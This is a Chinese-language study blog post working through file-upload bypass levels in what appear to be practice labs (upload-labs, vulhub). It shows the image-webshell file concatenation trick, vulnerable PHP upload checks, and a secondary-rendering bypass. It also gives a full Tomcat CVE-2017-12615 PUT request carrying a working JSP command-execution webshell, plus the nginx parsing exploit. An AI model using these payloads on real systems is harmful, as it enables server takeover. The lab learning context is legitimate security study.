---
title: "内容逻辑绕过"
date: 2026-04-07
published: 2026-04-07
permalink: /posts/文件上传模块/内容逻辑绕过/
author: Rin
categories:
  - 笔记
tags:
  - Study
  - Linux
---

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png?x-oss-process=image%2Fresize%2Cw_752%2Cresize%2Cw_752)

  

```
copy 1.png /b + shell.php /a webshell.jpg

文件头检测
图像文件信息判断
逻辑安全=二次渲染
逻辑安全-条件竞争目录命名-x.php/.
脚本函数漏洞-CVE-2015-2348
数组接受+目录命名
```

---

`copy 1.png /b + shell.php /a webshell.jpg`意思是将shell.php中的代码追加到1.png中并重新生成一个叫webshell.php的代码。

### 第十三关

  

用上面的代码制作成图片马然后正常上传，获取到图片的地址。然后打开文件包含漏洞页面

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627616865908-81e0690a-ebd9-4666-94ef-42bd9e5719e8.png)

将刚才上传的图片作为参数发送给服务器。然后获取到webshell

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627616932146-1e0a32d1-87ef-4725-8ee6-475da2e2611b.png)

也可以用蚁剑这种工具拿下webshell

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627617044887-4b7af82a-2476-4847-91b6-34b66edd013c.png)

### 第十四关

```
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

`getimagesize`代码的核心就是使用这个函数这个函数会对文件头进行验证，比如GIF的文件头问`GIF89a`png的文件头为`塒NG`，所以此处正常上传一个图片马将后缀改名为PHP即可

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627638312770-be323ee8-6db9-4abe-87f2-f160b51dc1c4.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627638365997-ce0e7b45-871a-4de2-9079-b30598db9d9a.png)

### 第十五关

和上面的一关基本是一样的只需要正常的上传然后结合文件包含漏洞利用。

### 第十六关

[https://xz.aliyun.com/t/2657#toc-13](https://xz.aliyun.com/t/2657#toc-13)

[https://blog.csdn.net/m0_46436640/article/details/107809772](https://blog.csdn.net/m0_46436640/article/details/107809772)

这一关的难度相对来说比较大，因为文件的验证比较复杂。

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagejpeg($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagepng($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagegif($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

先上传一张图片马然后下载，将下载的图片马和原先的图片进行对比，发现没有被渲染的位置插入PHP代码最后在上传，再下载观察PHP代码是否被渲染。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627695097473-505e8510-5117-4f80-b6b5-a4f496bba319.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627695179739-c35c7099-87c4-4215-9a05-5bd511c2769d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627695201518-dd5e1504-896e-49c4-bb6b-e929369ec41e.png)

### 第十七关

  

  

  

  

  

### 中间件解析漏洞

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627704450243-9bee5bef-7b03-48e4-975a-d94440fb63ed.png)

  

#### tomcat文件解析漏洞

CVE-2017-12615

环境搭建[https://vulhub.org/#/environments/tomcat/CVE-2017-12615/](https://vulhub.org/#/environments/tomcat/CVE-2017-12615/)

  

```
jiang@ubuntu:/opt/vulhub/vulhub-master/tomcat/CVE-2017-12615$ docker-compose up -d
```

访问ip:port

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627704006227-5188cc28-06a4-4ff2-b5d0-0a289d3114e8.png)

burp修改数据包

```
PUT /1.jsp/ HTTP/1.1
Host: 10.1.1.7:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 750


<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
     
    <%!public static String excuteCmd(String c) {
     
    StringBuilder line = new StringBuilder();
     
    try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
     
    String temp = null;while ((temp = buf.readLine()) != null) {
     
    line.append(temp+"\n");}buf.close();} catch (Exception e) {
     
    line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){
     
    out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>
```

访问`[http://10.1.1.7:8080/1.jsp?&pwd=023&cmd=id](http://10.1.1.7:8080/1.jsp?&pwd=023&cmd=id)`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627704086445-3cb3d0fb-27e1-4d41-ab42-77f01a7520ee.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627704132499-62b1b8f0-ebc1-433d-b54c-67b865630c99.png)

#### nginx解析漏洞

环境搭建:[https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/](https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/)

```
jiang@ubuntu:/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability$ pwd
/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability
jiang@ubuntu:/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability$ docker-compose up -d
```

正常上传一张图片马

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627718069629-b96ac2d8-254e-41b7-8a0c-a3610bd883f9.png)

然后在URL后面添加/xx.php 文件名随便

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627718136736-4aca7e60-49ff-471d-a770-c91a30f080c0.png)